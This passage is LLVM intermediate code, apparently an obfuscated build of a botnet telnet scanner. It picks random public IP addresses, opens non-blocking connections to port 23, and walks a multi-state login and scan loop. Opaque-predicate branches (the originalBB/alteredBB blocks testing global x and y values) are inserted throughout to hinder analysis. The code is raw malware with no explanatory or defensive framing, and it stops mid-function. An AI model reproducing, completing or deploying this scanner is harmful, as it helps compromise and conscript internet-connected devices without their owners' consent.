  %39 = phi i32 [ 512, %19 ], [ %29, %originalBBpart2 ]
  store i32 %39, i32* %1, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = call zeroext i16 @htons(i16 zeroext 23) #13
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %1, align 4
  %46 = zext i32 %45 to i64
  %47 = call i8* @llvm.stacksave()
  store i8* %47, i8** %9, align 8
  %48 = alloca %struct.telstate_t, i64 %46, align 16
  %49 = bitcast %struct.telstate_t* %48 to i8*
  %50 = load i32, i32* %1, align 4
  %51 = sext i32 %50 to i64
  %52 = mul i64 %51, 5
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 %52, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %53

; <label>:53:                                     ; preds = %72, %38
  %54 = load i32, i32* %2, align 4
  %55 = load i32, i32* %1, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %2, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = call noalias i8* @malloc(i64 1024) #2
  %63 = load i32, i32* %2, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 8
  store i8* %62, i8** %66, align 8
  %67 = load i32, i32* %2, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 8
  %71 = load i8*, i8** %70, align 8
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 1024, i32 1, i1 false)
  br label %72

; <label>:72:                                     ; preds = %57
  %73 = load i32, i32* %2, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %2, align 4
  br label %53

; <label>:75:                                     ; preds = %53
  %76 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %76, align 8
  %77 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %77, align 8
  br label %78

; <label>:78:                                     ; preds = %1454, %75
  br label %79

; <label>:79:                                     ; preds = %78
  %80 = load i32, i32* @x.63
  %81 = load i32, i32* @y.64
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  store i32 0, i32* %2, align 4
  %88 = load i32, i32* @x.63
  %89 = load i32, i32* @y.64
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %96

; <label>:96:                                     ; preds = %originalBBpart2131, %originalBBpart24
  %97 = load i32, i32* @x.63
  %98 = load i32, i32* @y.64
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = load i32, i32* %2, align 4
  %106 = load i32, i32* %1, align 4
  %107 = icmp slt i32 %105, %106
  %108 = load i32, i32* @x.63
  %109 = load i32, i32* @y.64
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %107, label %116, label %1454

; <label>:116:                                    ; preds = %originalBBpart28
  %117 = load i32, i32* @x.63
  %118 = load i32, i32* @y.64
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %116
  %125 = load i32, i32* %2, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 8
  %130 = zext i8 %129 to i32
  %131 = load i32, i32* @x.63
  %132 = load i32, i32* @y.64
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  switch i32 %130, label %1434 [
    i32 0, label %139
    i32 1, label %376
    i32 2, label %580
    i32 3, label %712
    i32 4, label %812
    i32 5, label %1016
    i32 6, label %1116
    i32 7, label %1324
    i32 8, label %1368
  ]

; <label>:139:                                    ; preds = %originalBBpart212
  %140 = load i32, i32* %2, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 8
  %144 = load i8*, i8** %143, align 8
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 1024, i32 1, i1 false)
  %145 = load i32, i32* %2, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 3
  %149 = load i8, i8* %148, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %187

; <label>:151:                                    ; preds = %139
  %152 = load i32, i32* @x.63
  %153 = load i32, i32* @y.64
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %151
  %160 = load i32, i32* %2, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 8
  %164 = load i8*, i8** %163, align 8
  store i8* %164, i8** %11, align 8
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %166
  %168 = bitcast %struct.telstate_t* %167 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 32, i32 16, i1 false)
  %169 = load i8*, i8** %11, align 8
  %170 = load i32, i32* %2, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 8
  store i8* %169, i8** %173, align 8
  %174 = call i32 @getRandomPublicIP()
  %175 = load i32, i32* %2, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 1
  store i32 %174, i32* %178, align 4
  %179 = load i32, i32* @x.63
  %180 = load i32, i32* @y.64
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %242

; <label>:187:                                    ; preds = %139
  %188 = load i32, i32* @x.63
  %189 = load i32, i32* @y.64
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %187
  %196 = load i32, i32* %2, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 5
  %200 = load i8, i8* %199, align 1
  %201 = add i8 %200, 1
  store i8 %201, i8* %199, align 1
  %202 = load i32, i32* %2, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 5
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i64
  %208 = icmp eq i64 %207, 16
  %209 = load i32, i32* @x.63
  %210 = load i32, i32* @y.64
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart221, label %originalBB18alteredBB

originalBBpart221:                                ; preds = %originalBB18
  br i1 %208, label %217, label %228

; <label>:217:                                    ; preds = %originalBBpart221
  %218 = load i32, i32* %2, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 5
  store i8 0, i8* %221, align 1
  %222 = load i32, i32* %2, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 4
  %226 = load i8, i8* %225, align 2
  %227 = add i8 %226, 1
  store i8 %227, i8* %225, align 2
  br label %228

; <label>:228:                                    ; preds = %217, %originalBBpart221
  %229 = load i32, i32* %2, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 4
  %233 = load i8, i8* %232, align 2
  %234 = zext i8 %233 to i64
  %235 = icmp eq i64 %234, 7
  br i1 %235, label %236, label %241

; <label>:236:                                    ; preds = %228
  %237 = load i32, i32* %2, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 3
  store i8 1, i8* %240, align 1
  br label %1435

; <label>:241:                                    ; preds = %228
  br label %242

; <label>:242:                                    ; preds = %241, %originalBBpart216
  %243 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %243, align 4
  %244 = call zeroext i16 @htons(i16 zeroext 23) #13
  %245 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %244, i16* %245, align 2
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %247 = getelementptr inbounds [8 x i8], [8 x i8]* %246, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %247, i8 0, i64 8, i32 4, i1 false)
  %248 = load i32, i32* %2, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %249
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %250, i32 0, i32 1
  %252 = load i32, i32* %251, align 4
  %253 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %254 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %253, i32 0, i32 0
  store i32 %252, i32* %254, align 4
  %255 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %256 = load i32, i32* %2, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %257
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %258, i32 0, i32 0
  store i32 %255, i32* %259, align 16
  %260 = load i32, i32* %2, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 0
  %264 = load i32, i32* %263, align 16
  %265 = bitcast %struct.timeval* %10 to i8*
  %266 = call i32 @setsockopt(i32 %264, i32 1, i32 20, i8* %265, i32 16) #2
  %267 = load i32, i32* %2, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = bitcast %struct.timeval* %10 to i8*
  %273 = call i32 @setsockopt(i32 %271, i32 1, i32 21, i8* %272, i32 16) #2
  %274 = load i32, i32* %2, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %275
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 16
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %280, label %297

; <label>:280:                                    ; preds = %242
  %281 = load i32, i32* @x.63
  %282 = load i32, i32* @y.64
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %280
  %289 = load i32, i32* @x.63
  %290 = load i32, i32* @y.64
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %1435

; <label>:297:                                    ; preds = %242
  %298 = load i32, i32* @x.63
  %299 = load i32, i32* @y.64
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %297
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = call i32 (i32, i32, ...) @fcntl(i32 %315, i32 3, i8* null)
  %317 = or i32 %316, 2048
  %318 = call i32 (i32, i32, ...) @fcntl(i32 %310, i32 4, i32 %317)
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %325 = call i32 @connect(i32 %323, %struct.sockaddr* %324, i32 16)
  %326 = icmp eq i32 %325, -1
  %327 = load i32, i32* @x.63
  %328 = load i32, i32* @y.64
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart235, label %originalBB27alteredBB

originalBBpart235:                                ; preds = %originalBB27
  br i1 %326, label %335, label %366

; <label>:335:                                    ; preds = %originalBBpart235
  %336 = load i32, i32* @x.63
  %337 = load i32, i32* @y.64
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %335
  %344 = call i32* @__errno_location() #13
  %345 = load i32, i32* %344, align 4
  %346 = icmp ne i32 %345, 115
  %347 = load i32, i32* @x.63
  %348 = load i32, i32* @y.64
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %346, label %355, label %366

; <label>:355:                                    ; preds = %originalBBpart239
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = call i32 @sclose(i32 %360)
  %362 = load i32, i32* %2, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 3
  store i8 1, i8* %365, align 1
  br label %375

; <label>:366:                                    ; preds = %originalBBpart239, %originalBBpart235
  %367 = load i32, i32* %2, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 2
  store i8 1, i8* %370, align 8
  %371 = load i32, i32* %2, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %372
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %373, i32 0, i32 6
  store i32 0, i32* %374, align 4
  br label %375

; <label>:375:                                    ; preds = %366, %355
  br label %1434

; <label>:376:                                    ; preds = %originalBBpart212
  %377 = load i32, i32* @x.63
  %378 = load i32, i32* @y.64
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %376
  %385 = load i32, i32* %2, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 6
  %389 = load i32, i32* %388, align 4
  %390 = icmp eq i32 %389, 0
  %391 = load i32, i32* @x.63
  %392 = load i32, i32* @y.64
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %390, label %399, label %405

; <label>:399:                                    ; preds = %originalBBpart243
  %400 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %401 = load i32, i32* %2, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 6
  store i32 %400, i32* %404, align 4
  br label %405

; <label>:405:                                    ; preds = %399, %originalBBpart243
  br label %406

; <label>:406:                                    ; preds = %405
  %407 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %408 = getelementptr inbounds [16 x i64], [16 x i64]* %407, i64 0, i64 0
  %409 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %408) #2, !srcloc !5
  %410 = extractvalue { i64, i64* } %409, 0
  %411 = extractvalue { i64, i64* } %409, 1
  %412 = trunc i64 %410 to i32
  store i32 %412, i32* %12, align 4
  %413 = ptrtoint i64* %411 to i64
  %414 = trunc i64 %413 to i32
  store i32 %414, i32* %13, align 4
  br label %415

; <label>:415:                                    ; preds = %406
  br label %416

; <label>:416:                                    ; preds = %415
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 0
  %421 = load i32, i32* %420, align 16
  %422 = srem i32 %421, 64
  %423 = zext i32 %422 to i64
  %424 = shl i64 1, %423
  %425 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %426 = load i32, i32* %2, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 0
  %430 = load i32, i32* %429, align 16
  %431 = sdiv i32 %430, 64
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds [16 x i64], [16 x i64]* %425, i64 0, i64 %432
  %434 = load i64, i64* %433, align 8
  %435 = or i64 %434, %424
  store i64 %435, i64* %433, align 8
  %436 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %436, align 8
  %437 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %437, align 8
  %438 = load i32, i32* %2, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 0
  %442 = load i32, i32* %441, align 16
  %443 = add nsw i32 %442, 1
  %444 = call i32 @select(i32 %443, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %444, i32* %3, align 4
  %445 = load i32, i32* %3, align 4
  %446 = icmp eq i32 %445, 1
  br i1 %446, label %447, label %504

; <label>:447:                                    ; preds = %416
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %448 = load i32, i32* %2, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = bitcast i32* %7 to i8*
  %454 = call i32 @getsockopt(i32 %452, i32 1, i32 4, i8* %453, i32* %6) #2
  %455 = load i32, i32* %7, align 4
  %456 = icmp ne i32 %455, 0
  br i1 %456, label %457, label %472

; <label>:457:                                    ; preds = %447
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 0
  %462 = load i32, i32* %461, align 16
  %463 = call i32 @sclose(i32 %462)
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 2
  store i8 0, i8* %467, align 8
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 3
  store i8 1, i8* %471, align 1
  br label %503

; <label>:472:                                    ; preds = %447
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 16
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = call i32 (i32, i32, ...) @fcntl(i32 %482, i32 3, i8* null)
  %484 = and i32 %483, -2049
  %485 = call i32 (i32, i32, ...) @fcntl(i32 %477, i32 4, i32 %484)
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 6
  store i32 0, i32* %489, align 4
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 7
  store i16 0, i16* %493, align 16
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 8
  %498 = load i8*, i8** %497, align 8
  call void @llvm.memset.p0i8.i64(i8* %498, i8 0, i64 1024, i32 1, i1 false)
  %499 = load i32, i32* %2, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 2
  store i8 2, i8* %502, align 8
  br label %1435

; <label>:503:                                    ; preds = %457
  br label %523

; <label>:504:                                    ; preds = %416
  %505 = load i32, i32* %3, align 4
  %506 = icmp eq i32 %505, -1
  br i1 %506, label %507, label %522

; <label>:507:                                    ; preds = %504
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 0
  %512 = load i32, i32* %511, align 16
  %513 = call i32 @sclose(i32 %512)
  %514 = load i32, i32* %2, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 2
  store i8 0, i8* %517, align 8
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 3
  store i8 1, i8* %521, align 1
  br label %522

; <label>:522:                                    ; preds = %507, %504
  br label %523

; <label>:523:                                    ; preds = %522, %503
  %524 = load i32, i32* @x.63
  %525 = load i32, i32* @y.64
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %523
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %533
